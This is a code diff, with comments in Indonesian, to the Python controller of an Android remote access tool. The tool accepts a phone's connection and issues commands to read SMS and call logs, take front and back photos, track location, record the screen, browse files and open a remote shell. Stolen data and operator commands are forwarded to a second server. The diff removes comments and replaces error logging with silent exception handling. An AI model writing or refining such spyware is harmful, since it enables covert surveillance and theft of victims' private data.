@@ -14,7 +14,7 @@ import requests
 
 # --- Konfigurasi dari Environment Variable ---
 TCP_PORT = int(os.environ.get('TCP_PORT', 9090))
-SERVER2_URL = os.environ.get('SERVER2_URL', '').rstrip('/')  # URL server2 dari environment
+SERVER2_URL = os.environ.get('SERVER2_URL', '').rstrip('/')
 HOST = '0.0.0.0'
 
 # --- Globals ---
@@ -61,13 +61,12 @@ print_startup_info()
 def forward_to_server2(data_type, payload):
     """Mengirim data ke Flask server (server2.py)"""
     if not SERVER2_URL:
-        return  # Skip if no server2 URL configured
+        return
     
     if not client_address:
         return
     
     try:
-        # Prepare data with client info
         data_to_send = {
             'type': data_type,
             'payload': payload,
@@ -77,24 +76,17 @@ def forward_to_server2(data_type, payload):
             }
         }
         
-        # Send to server2 with timeout using thread agar tidak blocking
         def send_request():
             try:
                 response = requests.post(
                     f"{SERVER2_URL}/api/data",
                     json=data_to_send,
-                    timeout=2  # Timeout 2 detik
+                    timeout=2
                 )
                 if response.status_code == 200:
                     logger.debug(f"Forwarded {data_type} to server2")
-                else:
-                    logger.debug(f"Server2 returned {response.status_code}")
-            except requests.exceptions.ConnectionError:
-                logger.debug(f"Server2 not reachable at {SERVER2_URL}")
-            except requests.exceptions.Timeout:
-                logger.debug("Timeout forwarding to server2")
-            except Exception as e:
-                logger.debug(f"Error forwarding to server2: {e}")
+            except:
+                pass
         
         threading.Thread(target=send_request, daemon=True).start()
             
@@ -118,7 +110,6 @@ def print_device_info(info):
   {Fore.YELLOW}Android Ver:   {Fore.WHITE}{info.get('AndroidVersion', 'N/A')} (SDK {info.get('SDKVersion', 'N/A')})
   {Fore.YELLOW}Battery:       {Fore.WHITE}{info.get('Battery', 'N/A')}
 {Fore.CYAN}--------------------------{Style.RESET_ALL}""")
-    # Forward ke server2
     forward_to_server2('DEVICE_INFO', info)
 
 def print_notification_log(log):
@@ -181,7 +172,6 @@ def handle_file_chunk(log_data, folder):
         sys.stdout.write(f"\r{Fore.BLUE}[DOWNLOAD] Receiving {filename}... {file_size/1024:.1f} KB")
         sys.stdout.flush()
         
-        # Forward progress ke server2 (optional)
         if file_size % (1024*1024) < 8192:
             forward_to_server2('FILE_PROGRESS', {
                 'filename': filename,
@@ -244,7 +234,6 @@ def handle_incoming_data(data):
         print(f"\n{Fore.RED}[ERROR] {error_msg}")
         forward_to_server2('ERROR', {'message': error_msg})
 
-# Handler tambahan
 def handle_location(payload):
     url = payload.get('url')
     print(f"\n{Fore.YELLOW}[LOCATION] {url}")
@@ -361,7 +350,8 @@ def client_listener(sock):
     in_shell_mode = False
     in_notification_mode = False
     in_gallery_mode = False
-    forward_to_server2('CONNECTION', {'status': 'disconnected', 'address': client_address[0] if client_address else 'unknown'})
+    if client_address:
+        forward_to_server2('CONNECTION', {'status': 'disconnected', 'address': client_address[0]})
 
 def send_command(cmd):
     """Mengirim command ke client"""
@@ -402,13 +392,11 @@ def shell():
             if not cmd_input:
                 continue
             
-            # Forward command ke server2 untuk logging
             forward_to_server2('COMMAND', {
                 'command': cmd_input,
                 'mode': 'shell' if in_shell_mode else 'notification' if in_notification_mode else 'gallery' if in_gallery_mode else 'main'
             })
             
-            # Handle special modes
             if in_notification_mode:
                 if cmd_input.strip().lower() == 'exit':
                     print(f"{Fore.YELLOW}Sending command: exit...", flush=True)
@@ -422,7 +410,6 @@ def shell():
                 running = False
                 break
             
-            # Send command to client
             if in_shell_mode:
                 if cmd == 'exit':
                     cmd_input = 'exit_shell'
@@ -457,7 +444,7 @@ def shell():
                 else:
                     print("Gallery commands: next, back, view <index>, exit")
                     
-            else:  # Main menu commands
+            else:
                 main_commands = ['shell', 'getsms', 'getcalllogs', 'flashon', 'flashoff', 
                                 'takefrontpic', 'takebackpic', 'list_app', 'get_location', 
                                 'screen_recorder', 'filemanager', 'notifikasi', 'gallery', 'deviceinfo']
@@ -491,7 +478,6 @@ def main():
     
     signal.signal(signal.SIGINT, signal_handler)
     
-    # Setup TCP server
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     
@@ -504,10 +490,8 @@ def main():
         else:
             print(f"[!] WARNING: No server2 URL configured. Set SERVER2_URL env variable to enable web interface.")
         
-        # Start shell thread
         threading.Thread(target=shell, daemon=True).start()
         
-        # Main accept loop
         while running:
             if not client_socket:
                 try:
@@ -523,7 +507,6 @@ def main():
                         'port': addr[1]
                     })
                     
-                    # Start listener thread untuk device ini
                     threading.Thread(target=client_listener, args=(conn,), daemon=True).start()
                     
                 except socket.timeout:
@@ -531,8 +514,8 @@ def main():
                 except Exception as e:
                     logger.error(f"Accept error: {e}")
                     time.sleep(1)
-            
-            time.sleep(0.1)
+            else:
+                time.sleep(0.1)
             
     except Exception as e:
         logger.error(f"Server error: {e}")
